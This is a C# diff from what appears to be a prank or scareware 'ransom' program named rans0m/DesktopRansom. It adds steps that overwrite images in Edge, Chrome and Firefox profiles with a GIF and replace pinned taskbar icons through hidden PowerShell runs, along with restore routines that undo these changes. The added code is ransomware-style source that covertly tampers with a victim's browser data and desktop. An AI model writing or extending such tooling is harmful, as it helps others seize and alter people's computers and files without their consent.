@@ -70,6 +70,8 @@ namespace rans0m
             public List<IconBackup> IconBackups { get; set; } = new();
             public List<FolderIconBackup> FolderBackups { get; set; } = new();
             public List<ImageBackup> ImageBackups { get; set; } = new();
+            public List<MediaSwapManager.BrowserBackup> BrowserBackups { get; set; } = new();
+            public List<MediaSwapManager.TaskbarBackup> TaskbarBackups { get; set; } = new();
             public WallpaperBackup? Wallpaper { get; set; }
         }
         public class RenameEntry
@@ -474,6 +476,22 @@ namespace rans0m
                     }
                     catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] App icon change fail: {ex.Message}"); }
 
+                    // 6) Browser images (Edge / Chrome / Firefox only) -> gif, recorded for restore.
+                    // Bounded (150 files / 64MB) and per-file guarded so big profiles stay fast.
+                    try
+                    {
+                        byte[] gifBytes = File.ReadAllBytes(gifToUse);
+                        data.BrowserBackups = MediaSwapManager.SwapBrowserImages(gifBytes);
+                    }
+                    catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Browser swap fail: {ex.Message}"); }
+
+                    // 7) Pinned taskbar shortcut icons -> our ico (two hidden PowerShell passes).
+                    try
+                    {
+                        data.TaskbarBackups = MediaSwapManager.SwapTaskbarIcons(icoPath);
+                    }
+                    catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Taskbar swap fail: {ex.Message}"); }
+
                     // Save json atomically
                     try
                     {
@@ -539,6 +557,9 @@ namespace rans0m
                     string json = File.ReadAllText(jp);
                     var data = JsonSerializer.Deserialize<RestoreData>(json);
                     if (data == null) throw new InvalidDataException("deserialize null");
+
+                    // 0) Stop frame animation FIRST so it can't overwrite the restore.
+                    try { WallpaperAnimator.Stop(); } catch { }
 
                     // 1) Restore wallpaper + style exactly (no res loss)
                     if (data.Wallpaper != null)
@@ -701,6 +722,10 @@ namespace rans0m
                         }
                         catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Rename restore {re.Renamed} fail: {ex.Message}"); }
                     }
+
+                    // 6) Restore browser images + taskbar icons swapped during the ransom.
+                    try { MediaSwapManager.RestoreBrowserImages(data.BrowserBackups); } catch { }
+                    try { MediaSwapManager.RestoreTaskbarIcons(data.TaskbarBackups); } catch { }
 
                     // Delete json
                     try
